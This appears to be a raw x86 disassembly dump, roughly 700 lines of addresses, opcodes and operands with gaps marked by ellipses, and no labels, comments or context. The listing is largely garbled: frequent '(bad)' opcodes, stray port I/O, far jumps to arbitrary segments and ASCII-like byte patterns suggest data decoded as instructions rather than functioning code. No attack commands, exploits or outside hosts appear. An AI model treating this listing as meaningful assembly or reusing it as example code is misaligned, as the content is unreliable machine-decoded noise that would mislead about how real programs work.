  44c374:	mov    ds:0x4dd04430,eax
  44c379:	xor    BYTE PTR [eax],al
  44c37b:	push   cs
  44c37c:	sub    esp,ebx
  44c37e:	xor    ch,BYTE PTR [esi+0x43]
  44c381:	inc    esp
  44c382:	xor    bh,BYTE PTR [edx]
  44c384:	cmp    esp,DWORD PTR [ecx+0x32]
  44c387:	xchg   ecx,eax
	...
  44c3a0:	add    BYTE PTR ds:0x259131e7,ah
  44c3a6:	clc    
  44c3a7:	xor    DWORD PTR [ebp+0x46],esi
  44c3aa:	(bad)  
  44c3ab:	xor    DWORD PTR [ebx+0x46],ecx
  44c3ae:	popf   
  44c3af:	xor    DWORD PTR [ebx+0x46],eax
  44c3b2:	inc    edx
  44c3b3:	xor    DWORD PTR [edi],ebx
  44c3b5:	inc    esi
  44c3b6:	pop    ecx
  44c3b7:	xor    DWORD PTR ds:0xe5315f26,eax
  44c3bd:	and    eax,0x2516310e
  44c3c2:	ret    0x4130
  44c3c5:	and    eax,0xc46a30ef
  44c3ca:	jle    0x44c3fc
  44c3cc:	mov    ah,0xd8
  44c3cf:	aaa    
  44c3d0:	xor    eax,0xb43796b0
  44c3d5:	scas   eax,DWORD PTR es:[edi]
  44c3d6:	imul   esi,DWORD PTR [esi],0xffffffbb
  44c3d9:	ror    BYTE PTR [ebx],0x3c
  44c3dc:	jecxz  0x44c391
  44c3de:	out    dx,al
  44c3df:	cmp    esp,esi
  44c3e1:	mov    edx,0xb3173ad6
  44c3e6:	test   al,0x3a
  44c3e8:	jge    0x44c3a4
  44c3ea:	and    edi,DWORD PTR [edx]
  44c3ec:	adc    DWORD PTR [esi-0x5337c65c],edi
  44c3f2:	outs   dx,BYTE PTR ds:[esi]
  44c3f3:	cmp    cl,ch
  44c3f5:	inc    edi
  44c3f6:	je     0x44c3f0
  44c3f8:	popa   
  44c3f9:	test   DWORD PTR [eax+eax*1],0x2ffda7ec
  44c400:	shl    DWORD PTR [edi+0x762f96],1
	...
  44c41e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44c41f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c420:	das    
  44c421:	jge    0x44c46a
  44c423:	scas   al,BYTE PTR es:[edi]
  44c424:	das    
  44c425:	add    BYTE PTR [eax],bl
  44c427:	pop    eax
  44c428:	lds    esi,FWORD PTR [eax]
  44c42a:	call   DWORD PTR [edi-0x2f]
  44c42d:	xor    BYTE PTR [edx],al
  44c42f:	pop    eax
  44c430:	out    0x30,al
  44c432:	pop    ebp
  44c433:	push   edi
  44c434:	push   ds
  44c435:	xor    DWORD PTR ds:0x20312f57,ebp
  44c43b:	push   edi
  44c43c:	inc    edi
  44c43d:	xor    DWORD PTR [ebx+0x57],edi
  44c440:	push   esi
  44c441:	xor    DWORD PTR [esi-0xace45aa],edi
  44c447:	push   esi
  44c448:	sti    
  44c449:	xor    DWORD PTR [edx+0x5a],esi
  44c44c:	mov    eax,0x33593132
  44c451:	xor    ebp,esp
  44c453:	inc    ebx
  44c454:	push   cs
  44c455:	xor    eax,0x36e94293
  44c45a:	add    BYTE PTR [ecx+0x6d],0x3a
  44c45e:	outs   dx,BYTE PTR ds:[esi]
  44c45f:	aas    
  44c460:	retf   
  44c461:	cmp    bh,cl
  44c463:	aas    
  44c464:	aaa    
  44c465:	cmp    ebx,DWORD PTR [ecx+0x40]
  44c468:	sar    DWORD PTR [ebx],cl
  44c46a:	mov    ebx,0xe63bf03f
  44c46f:	dec    ebx
  44c470:	test   BYTE PTR [esp+edi*2],bh
  44c473:	cmp    al,0xa4
  44c475:	cmp    al,0xc2
  44c477:	cmp    al,0x2d
  44c479:	cmp    eax,0x3da33e02
  44c47e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44c47f:	dec    ecx
  44c480:	cmp    DWORD PTR [esi],edi
	...
  44c49a:	add    BYTE PTR [eax+0x4b],al
  44c49d:	sar    BYTE PTR [esi],1
  44c49f:	leave  
  44c4a0:	dec    edx
  44c4a1:	pop    ds
  44c4a2:	aas    
  44c4a3:	or     BYTE PTR [edi+ebp*2+0x3f],cl
  44c4a7:	cmp    cl,BYTE PTR [esp+ebx*8+0x3f]
  44c4ab:	adc    cl,BYTE PTR [eax+edi*8-0x1]
  44c4af:	popf   
  44c4b0:	inc    edi
  44c4b1:	clc    
  44c4b2:	jmp    FWORD PTR [ebp+0x8]
  44c4b5:	add    BYTE PTR [eax],al
  44c4b7:	hlt    
  44c4b8:	mov    dh,0xcc
  44c4ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c4bb:	and    al,0x23
  44c4bd:	aam    0x66
  44c4bf:	and    eax,0x2583d35b
  44c4c4:	xchg   dl,dl
  44c4c6:	mov    ecx,0xed31525
  44c4cb:	push   es
  44c4cc:	jns    0x44c49c
  44c4ce:	cmp    eax,0xa8cdf706
  44c4d3:	push   es
  44c4d4:	dec    ch
  44c4d6:	out    dx,al
  44c4d7:	push   es
  44c4d8:	gs int 0x2c
  44c4db:	out    0xa7,eax
  44c4dd:	int    0x66
  44c4df:	out    0xbf,eax
  44c4e1:	int3   
  44c4e2:	cmp    al,ch
  44c4e4:	(bad)
  44c4e8:	jno    0x44c4b2
  44c4ea:	pop    ss
  44c4eb:	leave  
  44c4ec:	lahf   
  44c4ed:	iret   
  44c4ee:	push   0x7bced0c1
  44c4f3:	leave  
  44c4f4:	fmul   st(7),st
  44c4f6:	mov    al,cl
  44c4f8:	pusha  
  44c4f9:	retf   0x2a04
  44c4fc:	ret    
  44c4fd:	leave  
  44c4fe:	xchg   BYTE PTR [eax],al
	...
  44c518:	and    dh,BYTE PTR [ebx]
  44c51a:	leave  
  44c51b:	nop
  44c51c:	sub    esp,DWORD PTR [edx]
  44c51e:	int3   
  44c51f:	call   0x5e0d:0x8bc4fb1c
  44c526:	lds    edx,FWORD PTR [eax]
  44c528:	mulps  xmm0,xmm5
  44c52b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44c52c:	jmp    ebp
  44c52e:	(bad)
  44c531:	xchg   edx,eax
  44c532:	lds    edx,FWORD PTR [eax]
  44c534:	lock inc ebx
  44c536:	shl    BYTE PTR [ecx],0xe8
  44c539:	bswap  eax
  44c53b:	pop    ebx
  44c53c:	loopne 0x44c543
  44c53e:	enter  0xd888,0xd0
  44c542:	rcr    BYTE PTR [esi],0xd1
  44c545:	mov    dl,0xc7
  44c547:	or     cl,0x4
  44c54a:	mov    eax,cs
  44c54c:	dec    edx
  44c54d:	xor    BYTE PTR [edi],ah
  44c54f:	enter  0x309a,0x3f
  44c553:	enter  0x3305,0xb3
  44c557:	(bad)
  44c55a:	lds    ebx,FWORD PTR fs:[ebx+esi*1+0x320fc512]
  44c562:	test   al,0xc6
  44c564:	fnstenv [ecx]
  44c566:	xor    eax,0xe73243c6
  44c56b:	mov    bl,0x43
  44c56d:	jb     0x44c519
  44c56f:	add    esi,esp
  44c571:	add    al,0xc9
  44c573:	shr    ecx,cl
  44c575:	xor    al,0xaf
  44c577:	rcr    DWORD PTR [esi+0xd35534],cl
	...
  44c595:	jg     0x44c5cc
  44c597:	inc    esi
  44c598:	shl    DWORD PTR [eax],cl
  44c59a:	xor    eax,0x33c4d4ca
  44c59f:	xor    eax,0x6036d8d4
  44c5a4:	shl    BYTE PTR [esi-0x483012cb],cl
  44c5aa:	cmp    BYTE PTR [edx-0x30],al
  44c5ad:	aaa    
  44c5ae:	cmp    BYTE PTR [ebx],bh
  44c5b0:	iret   
  44c5b1:	mov    BYTE PTR [edi],dh
  44c5b3:	scas   al,BYTE PTR es:[edi]
  44c5b4:	iret   
  44c5b5:	shl    BYTE PTR [edi],1
  44c5b7:	pop    eax
  44c5b8:	into   
  44c5b9:	lods   eax,DWORD PTR ds:[esi]
  44c5ba:	cmp    DWORD PTR [ebp+ecx*8-0x33c9c63a],ebx
  44c5c1:	sub    bx,WORD PTR [edx+0x662de1cb]
  44c5c8:	leave  
  44c5c9:	push   ebp
  44c5ca:	xor    DWORD PTR [edx-0x18cce639],edi
  44c5d0:	mov    ds:0x3c671ab,eax
  44c5d5:	hlt    
  44c5d6:	add    al,0xd7
  44c5d8:	sar    BYTE PTR [eax],cl
  44c5da:	cmp    al,BYTE PTR [eax]
  44c5dc:	add    eax,ecx
  44c5de:	in     al,0x37
  44c5e0:	(bad)  
  44c5e1:	mov    edi,0xaf913692
  44c5e6:	cmp    DWORD PTR [esi+ebx*1],edi
  44c5e9:	lods   al,BYTE PTR ds:[esi]
  44c5ea:	test   eax,0x653a8639
  44c5ef:	cmp    ecx,ebp
  44c5f1:	xchg   DWORD PTR [ecx-0x8],esi
  44c5f4:	std    
  44c5f5:	test   DWORD PTR [eax+eax*1],0xca
	...
  44c610:	add    BYTE PTR [eax],al
  44c612:	inc    ebp
  44c613:	imul   esi,DWORD PTR [edx],0xffffff90
  44c616:	inc    ecx
  44c617:	je     0x44c64a
  44c619:	sar    BYTE PTR [eax],1
  44c61b:	fnstenv [eax]
  44c61d:	jl     0x44c650
  44c61f:	push   ebx
  44c620:	xor    bh,bh
  44c622:	das    
  44c623:	iret   
  44c624:	aaa    
  44c625:	dec    esi
  44c626:	inc    eax
  44c627:	imul   esi,DWORD PTR [edi],0x36033e99
  44c62d:	or     ch,BYTE PTR [esi]
  44c62f:	add    eax,0x8a2cb935
  44c634:	xor    al,0x22
  44c636:	cmp    eax,0x33e63450
  44c63b:	jno    0x44c635
  44c63d:	jmp    0x123d3839
  44c642:	test   DWORD PTR [eax+eax*1],0x2ef1c840
  44c649:	data16 (bad) 
  44c64b:	mov    DWORD PTR [esi],ebp
  44c64d:	jbe    0x44c615
  44c64f:	sub    DWORD PTR [esi],0x2e99c656
  44c655:	push   esi
  44c656:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c657:	xchg   ecx,eax
  44c658:	xchg   BYTE PTR cs:[esi-0x59a9d157],ah
  44c65f:	mov    eax,ds:0xb9a6562e
  44c664:	cs push esi
  44c666:	(bad)  
  44c667:	mov    cl,0x2e
  44c669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c66a:	(bad)  
  44c66b:	dec    ecx
  44c66c:	add    BYTE PTR cs:[edx+0x53],ch
  44c670:	retf   
  44c671:	xor    DWORD PTR [edx+0x31d353],eax
	...
  44c68f:	push   0x53
  44c691:	(bad)  [ecx]
  44c693:	jb     0x44c6e8
  44c695:	jecxz  0x44c6c8
  44c697:	sub    dl,BYTE PTR [ebx-0x15]
  44c69a:	xor    DWORD PTR [edx],esp
  44c69c:	push   ebx
  44c69d:	repz xor edx,ecx
  44c6a0:	push   edx
  44c6a1:	sti    
  44c6a2:	xor    DWORD PTR [edx+0x56],edx
  44c6a5:	add    esi,DWORD PTR [edx]
  44c6a7:	push   0x56
  44c6a9:	or     esi,DWORD PTR [edx]
  44c6ab:	inc    edx
  44c6ac:	push   esi
  44c6ad:	adc    esi,DWORD PTR [edx]
  44c6af:	sub    dl,BYTE PTR [esi+0x1b]
  44c6b2:	xor    dh,dl
  44c6b4:	push   edx
  44c6b5:	and    esi,DWORD PTR [edx]
  44c6b7:	sub    dl,BYTE PTR [esi+0x2b]
  44c6ba:	xor    ah,BYTE PTR [edx]
  44c6bc:	push   esi
  44c6bd:	xor    esi,DWORD PTR [edx]
  44c6bf:	dec    edx
  44c6c0:	push   esi
  44c6c1:	cmp    esi,DWORD PTR [edx]
  44c6c3:	push   edx
  44c6c4:	push   esi
  44c6c5:	inc    ebx
  44c6c6:	xor    ch,BYTE PTR [edx+0x56]
  44c6c9:	dec    ebx
  44c6ca:	xor    al,BYTE PTR [edx+0x6a325356]
  44c6d0:	push   esi
  44c6d1:	pop    ebx
  44c6d2:	xor    dh,BYTE PTR [edx+0x56]
  44c6d5:	arpl   WORD PTR [edx],si
  44c6d7:	stos   BYTE PTR es:[edi],al
  44c6d8:	imul   esi,DWORD PTR ss:[edx],0xffffffa2
  44c6dc:	ss jae 0x44c711
  44c6df:	dec    edx
  44c6e0:	aaa    
  44c6e1:	jnp    0x44c715
  44c6e3:	push   edx
  44c6e4:	aaa    
  44c6e5:	xor    DWORD PTR [edx],0x6a
  44c6e8:	aaa    
  44c6e9:	mov    esi,DWORD PTR [edx]
  44c6eb:	inc    edx
  44c6ec:	aaa    
  44c6ed:	xchg   ebx,eax
  44c6ee:	xor    ch,BYTE PTR [edx]
  44c6f0:	aaa    
  44c6f1:	fwait
  44c6f2:	xor    al,BYTE PTR [eax]
	...
  44c70c:	jb     0x44c744
  44c70e:	sbb    esi,DWORD PTR [ebx]
  44c710:	mov    dl,0x36
  44c712:	and    esi,DWORD PTR [ebx]
  44c714:	stos   BYTE PTR es:[edi],al
  44c715:	sub    esi,DWORD PTR ss:[ebx]
  44c718:	hlt    
  44c719:	dec    esi
  44c71a:	xor    DWORD PTR ds:0x3d313ee7,esi
  44c720:	out    0x1e,eax
  44c722:	xor    DWORD PTR [ebp-0x19],eax
  44c725:	push   ds
  44c726:	xor    DWORD PTR [ebp-0x39],ecx
  44c729:	push   cs
  44c72a:	xor    DWORD PTR [ebp-0x39],edx
  44c72d:	(bad)  
  44c72e:	xor    BYTE PTR [ebp-0x39],bl
  44c731:	xor    DWORD PTR ds:[ebp-0x39],esp
  44c735:	xor    DWORD PTR ds:[ebp+0x27],ebp
  44c739:	dec    edi
  44c73a:	xor    DWORD PTR [ebp+0x27],esi
  44c73d:	aas    
  44c73e:	xor    DWORD PTR [ebp+0x27],edi
  44c741:	fbstp  TBYTE PTR [eax]
  44c743:	test   DWORD PTR [edi],esp
  44c745:	fbstp  TBYTE PTR [eax]
  44c747:	lea    eax,[edi]
  44c749:	iret   
  44c74a:	xor    BYTE PTR [ebp-0x62cf40f9],dl
  44c750:	pop    es
  44c751:	mov    edi,0xbf07a530
  44c756:	xor    BYTE PTR [ebp-0x4acf3119],ch
  44c75c:	out    0xbe,eax
  44c75e:	xor    BYTE PTR [ebp-0x3acee119],bh
  44c764:	out    0x1e,eax
  44c766:	xor    ebp,ecx
  44c768:	(bad)  
  44c769:	push   cs
  44c76a:	xor    ebp,edx
  44c76c:	(bad)  
  44c76d:	(bad)  
  44c76e:	xor    BYTE PTR [eax+eax*1+0x0],al
	...
  44c789:	enter  0x362d,0x87
  44c78d:	mov    esi,0x2f0b3a4a
  44c792:	xor    al,0x39
  44c794:	pop    ebx
  44c795:	das    
  44c796:	(bad)  
  44c797:	cmp    BYTE PTR [ebx-0x34c676e1],dh
  44c79d:	pop    ds
  44c79e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c79f:	cmp    DWORD PTR [eax+edx*1+0x7c],ebx
  44c7a3:	cmp    BYTE PTR [eax+0x353e0808],bh
  44c7a9:	add    al,BYTE PTR ds:0x2f494243
  44c7af:	out    dx,al
  44c7b0:	inc    edx
  44c7b1:	mov    edi,0xab13e72e
  44c7b6:	outs   dx,BYTE PTR ds:[esi]
  44c7b7:	cli    
  44c7b8:	add    esi,esp
  44c7ba:	add    al,0x20
  44c7bc:	xor    al,0xa
  44c7be:	xor    eax,0x31f9357f
  44c7c3:	add    dh,BYTE PTR [edi]
  44c7c5:	jl     0x44c7f9
  44c7c7:	aas    
  44c7c8:	ss push ecx
  44c7ca:	xor    al,BYTE PTR [edx+0x36]
  44c7cd:	enter  0x6438,0x37
  44c7d1:	xchg   edi,eax
  44c7d2:	cmp    DWORD PTR [ebp+0x2439a837],edx
  44c7d8:	aaa    
  44c7d9:	xor    BYTE PTR [ecx],bh
  44c7db:	dec    edx
  44c7dc:	aaa    
  44c7dd:	stc    
  44c7de:	aaa    
  44c7df:	cld    
  44c7e0:	cmp    bh,bh
  44c7e2:	sar    DWORD PTR ss:[ecx],cl
  44c7e5:	lds    esi,FWORD PTR [esi]
  44c7e7:	pusha  
  44c7e8:	cmp    DWORD PTR [edi+esi*1+0x47],esp
  44c7ec:	cmp    DWORD PTR [eax],eax
	...
  44c806:	xor    al,0x37
  44c808:	cmp    DWORD PTR cs:[ebx-0x71c35dd3],edx
  44c80f:	sub    al,0xee
  44c811:	cmp    eax,0x3e2d2998
  44c816:	cmp    eax,0xd63fdb2a
  44c81b:	xor    BYTE PTR [edi+edi*1],ch
  44c81e:	xchg   edi,eax
  44c81f:	das    
  44c820:	dec    esi
  44c821:	inc    eax
  44c822:	dec    ecx
  44c823:	xor    BYTE PTR [edi-0xdcfe9c1],dh
  44c829:	inc    eax
  44c82a:	push   cs
  44c82b:	or     eax,DWORD PTR cs:[ecx+0x24]
  44c82f:	cs and al,0x41
  44c832:	push   edx
  44c833:	cs inc eax
  44c835:	inc    ecx
  44c836:	lods   eax,DWORD PTR ds:[esi]
  44c837:	sub    eax,0x6dd323e7
  44c83c:	inc    DWORD PTR [eax-0x1dfffb10]
  44c842:	pop    es
  44c843:	or     eax,0xc907e130
  44c848:	das    
  44c849:	push   ss
  44c84a:	call   0xe092f7d9
  44c84f:	mov    dl,0x2f
  44c851:	lock out 0x1c,al
  44c854:	das    
  44c855:	(bad)  
  44c856:	out    0xe9,al
  44c858:	cs push eax
  44c85a:	(bad)  
  44c85b:	pop    esi
  44c85c:	cs mov edx,0x672dcfc1
  44c862:	retf   0x2d8b
  44c865:	mov    es,edx
  44c867:	call   0x0:0x952d
	...
  44c882:	add    BYTE PTR [edx],ch
  44c884:	mov    cl,0x2d
  44c886:	sub    esp,DWORD PTR [edx]
  44c888:	cmp    eax,0x532a1f2d
  44c88d:	sub    eax,0x2d622225
  44c892:	push   edx
  44c893:	or     bh,BYTE PTR [ecx+0x2d]
  44c896:	xor    al,BYTE PTR [edx]
  44c898:	add    eax,0x1f09032d
  44c89d:	sub    eax,0x2d2c00e0
  44c8a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c8a3:	call   0xe0fef561
  44c8a8:	aad    0x2c
  44c8aa:	mov    al,ch
  44c8ac:	jecxz  0x44c8da
  44c8ae:	jns    0x44c890
  44c8b0:	repnz sub al,0x7e
  44c8b3:	enter  0x2c82,0x62
  44c8b7:	ror    DWORD PTR [esi+0x2c],0xb1
  44c8bb:	retf   
  44c8bc:	mov    edx,0x5dbc4e33
  44c8c1:	xor    eax,DWORD PTR [eax+0x2b]
  44c8c4:	clc    
  44c8c5:	xor    dl,BYTE PTR [esi+0x23]
  44c8c8:	jae    0x44c8fc
  44c8ca:	dec    ecx
  44c8cb:	push   ds
  44c8cc:	sahf   
  44c8cd:	xor    BYTE PTR [eax],al
  44c8cf:	xchg   edi,eax
  44c8d0:	sub    eax,0x30b137df
  44c8d5:	pop    esi
  44c8d6:	cmp    cl,bl
  44c8d8:	das    
  44c8d9:	cmp    DWORD PTR es:[esi],ebp
  44c8dc:	xor    BYTE PTR [edi],ch
  44c8de:	cmp    edi,edi
  44c8e0:	sub    DWORD PTR [ecx+0x3b],esi
  44c8e3:	leave  
  44c8e4:	sub    al,0xf9
  44c8e6:	cmp    al,0x0
	...
  44c900:	push   edx
  44c901:	sub    esi,DWORD PTR [edi]
  44c903:	ds add eax,edi
  44c906:	push   esi
  44c907:	ds add al,0xc7
  44c90a:	lods   al,BYTE PTR ds:[esi]
  44c90b:	ds adc esi,eax
  44c90e:	push   es
  44c90f:	aas    
  44c910:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44c911:	(bad)
  44c914:	lea    edi,[eax]
  44c916:	stc    
  44c917:	(bad)  
  44c918:	std    
  44c919:	pop    es
  44c91a:	add    BYTE PTR [eax],al
  44c91c:	pop    ebx
  44c91d:	aaa    
  44c91e:	add    eax,0xcd380d31
  44c923:	xor    edx,ecx
  44c925:	les    esi,FWORD PTR ss:[edx]
  44c928:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44c929:	xor    al,0x66
  44c92b:	xor    al,0x82
  44c92d:	xor    al,0xcd
  44c92f:	xor    al,0x2b
  44c931:	xor    ecx,DWORD PTR [edi+0x47330f35]
  44c937:	xor    DWORD PTR ss:[esi],ebp
  44c93a:	jp     0x44c972
  44c93c:	je     0x44c96c
  44c93e:	mov    al,ds:0x332d2d36
  44c943:	aaa    
  44c944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c945:	sub    al,0x40
  44c947:	cmp    BYTE PTR [ecx-0x3bc761d1],bl
  44c94d:	das    
  44c94e:	pop    es
  44c94f:	cmp    DWORD PTR [ecx+0x2f],edx
  44c952:	mov    WORD PTR [ecx],?
  44c954:	pushf  
  44c955:	cs (bad) 
  44c957:	cmp    DWORD PTR [esi+0x2a],ebx
  44c95a:	(bad)  
  44c95b:	cmp    esp,esp
  44c95d:	sub    eax,0xd4f43a3d
  44c962:	xor    eax,0x85
	...
  44c97b:	add    BYTE PTR [eax],al
  44c97d:	push   ds
  44c97e:	div    DWORD PTR ds:0x35ef1ea5
  44c984:	aad    0xe
  44c986:	lods   eax,DWORD PTR ds:[esi]
  44c987:	xor    eax,0x354b0ef6
  44c98c:	sub    al,0xff
  44c98e:	pop    ebx
  44c98f:	xor    eax,0x34feff5c
  44c994:	addr16 out dx,eax
  44c996:	or     al,0x35
  44c998:	jno    0x44c989
  44c99a:	in     eax,dx
  44c99b:	xor    al,0x98
  44c99d:	(bad)  
  44c99f:	xor    al,0x12
  44c9a1:	fdivr  DWORD PTR [eax+edi*1]
  44c9a4:	dec    ecx
  44c9a5:	shr    BYTE PTR [ebp+0x38],1
  44c9a8:	fs leave 
  44c9aa:	out    0x3e,eax
  44c9ac:	fadd   st,st(1)
  44c9ae:	ja     0x44c9ea
  44c9b0:	mov    al,ds:0xcc3a1cba
  44c9b5:	xor    cl,ch
  44c9b7:	cmp    DWORD PTR [ecx],ebx
  44c9b9:	sub    ecx,DWORD PTR [eax]
  44c9bb:	cmp    DWORD PTR [eax],eax
  44c9bd:	hlt    
  44c9be:	pop    ebp
  44c9bf:	mov    esp,0xfca95bfe
  44c9c4:	push   esp
  44c9c6:	mov    ch,0x2c
  44c9c8:	mov    ds:0x84333904,eax
  44c9cd:	add    eax,0x5d13321
  44c9d2:	pop    ebx
  44c9d3:	cs dec edi
  44c9d5:	out    0xff,al
  44c9d7:	sub    eax,0x2d55e6fe
  44c9dc:	mov    edi,esp
  44c9de:	sbb    ch,BYTE PTR ds:0x69
	...
  44c9f8:	add    BYTE PTR [eax],al
  44c9fa:	loopne 0x44c9b5
  44c9fc:	aaa    
  44c9fd:	mov    dl,cl
  44c9ff:	int    0x30
  44ca01:	fadd   st(3),st
  44ca03:	cli    
  44ca04:	xor    cl,dh
  44ca06:	retf   
  44ca07:	scas   eax,DWORD PTR es:[edi]
  44ca08:	xor    al,0x35
  44ca0a:	mov    esp,0xb83b8c04
  44ca0f:	sub    eax,0x2de13bbf
  44ca14:	cmc    
  44ca15:	cmp    al,0xc
  44ca17:	sub    al,0x1c
  44ca19:	cmp    eax,0x3c742c3f
  44ca1e:	xchg   edi,eax
  44ca1f:	sub    al,0xc3
  44ca21:	cmp    al,0xcb
  44ca23:	sub    al,0xde
  44ca25:	cmp    ecx,esi
  44ca27:	cs int 0x39
  44ca2a:	clc    
  44ca2b:	sub    bh,BYTE PTR cs:[edx]
  44ca2e:	inc    ebp
  44ca2f:	das    
  44ca30:	adc    BYTE PTR [edx],bh
  44ca32:	jp     0x44ca63
  44ca34:	pop    eax
  44ca35:	cmp    DWORD PTR [edi+ebp*1+0x2fab399b],esi
  44ca3c:	cdq    
  44ca3d:	cmp    DWORD PTR [ebx+0x2e],edx
  44ca40:	and    eax,0x152b2b41
  44ca45:	aas    
  44ca46:	add    al,0x2a
  44ca48:	jmp    0x72d3:0xe704f43e
  44ca4f:	push   0xffffffce
  44ca51:	add    esi,esp
  44ca53:	add    al,0x7f
  44ca55:	xor    al,0x7d
  44ca57:	aaa    
  44ca58:	inc    ebp
  44ca59:	xor    ebp,ebx
  44ca5b:	xor    eax,0x3270
	...
  44ca74:	add    BYTE PTR [eax],al
  44ca76:	add    BYTE PTR [esi+0x36],bh
  44ca79:	push   ebx
  44ca7a:	xor    ch,BYTE PTR [esi]
  44ca7c:	ss dec ebx
  44ca7e:	xor    bh,BYTE PTR [edi+ebp*1+0x32f83841]
  44ca85:	xchg   edi,eax
  44ca86:	xor    eax,0x36803359
  44ca8b:	pop    edx
  44ca8c:	xor    bl,BYTE PTR [ebx+0x682ca93b]
  44ca92:	cmp    ebp,DWORD PTR [eax+0x2d]
  44ca95:	dec    ebx
  44ca96:	cmp    edx,DWORD PTR [edx+0x2d]
  44ca99:	sub    DWORD PTR [ebx],edi
  44ca9b:	or     al,0x2d
  44ca9d:	add    bh,bl
  44ca9f:	rol    dh,0x36
  44caa2:	xchg   ebx,eax
  44caa3:	mov    eax,0x2d683522
  44caa8:	ins    DWORD PTR es:[edi],dx
  44caa9:	xor    al,0xe6
  44caab:	sub    ecx,DWORD PTR [edi]
  44caad:	cmp    al,0xe2
  44caaf:	and    cl,dh
  44cab1:	cmp    bl,BYTE PTR [ebx+0x1b]
  44cab4:	xchg   esi,eax
  44cab5:	cmp    al,ah
  44cab7:	adc    ebx,edi
  44cab9:	cmp    BYTE PTR ds:0x7c389f09,dh
  44cabf:	add    DWORD PTR [edi+0x38],eax
  44cac2:	popf   
  44cac3:	stc    
  44cac4:	push   eax
  44cac5:	cmp    dh,al
  44cac7:	icebp  
  44cac8:	jo     0x44cb02
  44caca:	mov    ds:0xe90004e9,eax
  44cacf:	xchg   edi,eax
  44cad0:	push   0xfffffff8
  44cad2:	sbb    eax,esi
  44cad4:	add    al,0x0
  44cad6:	xchg   edi,eax
  44cad7:	enter  0x2f12,0xb5
	...
  44caf3:	add    dh,al
  44caf5:	das    
  44caf6:	das    
  44caf7:	adc    al,0xc7
  44caf9:	fsubr  DWORD PTR [esi]
  44cafb:	pop    edx
  44cafc:	(bad)  
  44cafd:	push   eax
  44cafe:	cs push edi
  44cb00:	daa    
  44cb01:	pop    ss
  44cb02:	cs or  eax,0xa92e3726
  44cb08:	and    eax,0x25172d3b
  44cb0d:	aam    0x2c
  44cb0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44cb10:	add    al,0x7c
  44cb12:	sub    al,0xf1
  44cb14:	add    ebx,DWORD PTR [ecx]
  44cb16:	xor    al,0xa9
  44cb18:	or     esi,esi
  44cb1a:	xor    esp,DWORD PTR [ecx-0x4]
  44cb1d:	xchg   ecx,eax
  44cb1e:	xor    edi,DWORD PTR ds:0x15335cec
  44cb24:	in     al,dx
  44cb25:	outs   dx,DWORD PTR ds:[esi]
  44cb26:	xor    esp,esp
  44cb28:	jmp    0x32c8:0xe2d3330b
  44cb2f:	add    BYTE PTR [ebx+0x2f],dl
  44cb32:	arpl   WORD PTR [esi],si
  44cb34:	(bad)  
  44cb35:	das    
  44cb36:	cmp    BYTE PTR ss:[esi+0x2d],dl
  44cb3a:	mov    ch,0x38
  44cb3c:	(bad)  
  44cb3d:	sub    BYTE PTR [ecx],bl
  44cb3f:	cmp    DWORD PTR [esp+ebp*1-0x7f],eax
  44cb43:	cmp    ebx,ebx
  44cb45:	sub    bh,BYTE PTR cs:[edx]
  44cb48:	adc    BYTE PTR [ebx],ch
  44cb4a:	pop    esi
  44cb4b:	cmp    bh,BYTE PTR [edi]
  44cb4d:	sub    eax,DWORD PTR [ebx-0xd195c6]
  44cb53:	cmp    dh,bl
  44cb55:	sub    eax,0x0
	...
  44cb6e:	add    BYTE PTR [eax],al
  44cb70:	add    ch,cl
  44cb72:	je     0x44cb6d
  44cb74:	push   ecx
  44cb76:	add    BYTE PTR [eax],al
  44cb78:	add    BYTE PTR [edx-0x14c52ad4],bh
  44cb7e:	les    esp,FWORD PTR [edi+0x3c]
  44cb81:	sub    ebp,DWORD PTR [eax]
  44cb83:	mov    ah,0x3d
  44cb85:	popa   
  44cb86:	daa    
  44cb87:	lock cmp eax,0x3e1e2774
  44cb8d:	adc    eax,0x743ec32a
  44cb92:	sub    DWORD PTR [eax],eax
  44cb94:	add    BYTE PTR [ebp+0x51fff984],cl
  44cb9a:	add    al,0x0
  44cb9c:	add    dl,dl
  44cb9e:	xor    ebp,esp
  44cba0:	xor    BYTE PTR [ebp+0x33],dl
  44cba3:	xchg   edi,eax
  44cba4:	xor    DWORD PTR ds:0x2235b936,ecx
  44cbaa:	das    
  44cbab:	outs   dx,DWORD PTR ds:[esi]
  44cbac:	ss push edi
  44cbae:	xor    DWORD PTR [edi],edx
  44cbb0:	aaa    
  44cbb1:	sub    eax,0x9e376931
  44cbb6:	xor    ch,al
  44cbb8:	aaa    
  44cbb9:	mov    eax,0x60380e30
  44cbbe:	sub    al,0x5d
  44cbc0:	cmp    ah,dh
  44cbc2:	xor    DWORD PTR [ebp*2-0x79cb6b24],0x9834cdcc
  44cbcd:	int3   
  44cbce:	or     DWORD PTR ds:0x35a0bd0f,esi
  44cbd4:	xchg   DWORD PTR [eax],eax
	...
  44cbee:	mov    ebp,0x2e6135fa
  44cbf3:	out    0x39,al
  44cbf5:	mov    dl,0x2e
  44cbf7:	dec    esp
  44cbf8:	cmp    DWORD PTR [edx-0x46c875e0],edx
  44cbfe:	sbb    BYTE PTR [eax+0x37],bl
  44cc01:	cmp    eax,0xc2368211
  44cc06:	or     DWORD PTR [ecx-0x52fe1bca],edx
  44cc0c:	ss and eax,0xd435a2fa
  44cc12:	repnz mov WORD PTR ds:0x3533eb1c,?
  44cc19:	dec    ecx
  44cc1a:	jecxz  0x44cbbc
  44cc1c:	xor    al,0xce
  44cc1e:	fild   DWORD PTR [ebp+0x5df40034]
  44cc24:	mov    esi,?
  44cc26:	mov    ecx,DWORD PTR [ecx]
  44cc28:	add    al,0x0
  44cc2a:	hlt    
  44cc2b:	stos   DWORD PTR es:[edi],eax
  44cc2c:	sub    al,0xf3
